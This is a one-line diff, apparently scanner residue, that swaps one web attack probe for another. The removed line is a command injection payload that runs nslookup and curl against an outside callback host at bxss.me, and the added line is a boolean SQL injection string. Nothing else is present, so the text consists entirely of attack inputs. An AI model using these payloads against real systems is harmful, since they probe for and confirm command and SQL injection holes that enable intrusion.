@@ -1,1 +1,1 @@
-(nslookup -q=cname hitzbqccxfmdf44fa6.bxss.me||curl hitzbqccxfmdf44fa6.bxss.me))
+-1" OR 2+823-823-1=0+0+0+1 -- 
